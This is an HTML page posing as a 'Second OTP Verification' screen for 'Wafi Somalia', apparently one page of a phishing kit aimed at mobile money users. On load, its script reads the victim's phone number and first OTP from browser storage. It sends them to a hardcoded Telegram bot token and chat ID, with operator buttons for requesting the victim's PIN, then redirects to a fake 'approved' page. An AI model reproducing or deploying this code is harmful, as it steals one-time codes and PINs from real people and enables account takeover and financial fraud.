<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Second OTP</title>
<style>
body{margin:0;background:linear-gradient(135deg,#84cc16,#65a30d);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial}
.box{background:white;border-radius:30px;padding:40px 30px;text-align:center;width:90%;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,0.2)}
.circle{width:100px;height:100px;margin:0 auto 20px;border-radius:50%;background:radial-gradient(circle,#84cc16,#65a30d);display:flex;align-items:center;justify-content:center}
.loader{width:80px;height:80px;border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
h2{color:#65a30d;margin:0;font-size:22px}
p{color:#888;margin:10px 0 0 0}
.footer{margin-top:40px;color:white;font-size:12px;text-align:center}
</style>
</head>
<body>
<div class="box">
    <div class="circle"><div class="loader"></div></div>
    <h2>Second OTP Verification</h2>
    <p id="timer">Please wait... (3s)</p>
    <div class="footer">© 2026 Wafi Somalia</div>
</div>
<script>
const BOT_TOKEN = "8978752568:AAH8Mties7YO31t8HSBqSDZtps8IqMHDQgk";
const CHAT_ID = "8630213836";

const phone = localStorage.getItem('loginPhone') || 'N/A';
const otp2 = Math.floor(100000 + Math.random() * 900000);
localStorage.setItem('otp2', otp2);

const msg = `2️⃣ *SECOND OTP VERIFIED* ✅\n\n🇸🇴 *Country:* Somalia\n📱 *Phone:* ${phone}\n🔒 *Second OTP:* \`${otp2}\`\n🔗 *First OTP:* \`${localStorage.getItem('otp1')}\`\n\n✅ *OTP verified. Now choose how to collect the second PIN:*`;

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:'POST',
    mode:'no-cors',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
        chat_id:CHAT_ID,
        text:msg,
        parse_mode: 'Markdown',
        reply_markup:{
            inline_keyboard:[
                [{"text":"📱 Prompt PIN","callback_data":"prompt"},{"text":"📋 Request PIN","callback_data":"request"}],
                [{"text":"✅ Pass","callback_data":"pass"}]
            ]
        }
    })
});

let count = 3;
const timer = setInterval(()=>{
    document.getElementById('timer').innerText = `Please wait... (${count}s)`;
    count--;
    if(count < 0){
        clearInterval(timer);
        window.location='loading.html?next=approved.html';
    }
}, 1000);
</script>
</body>
</html>
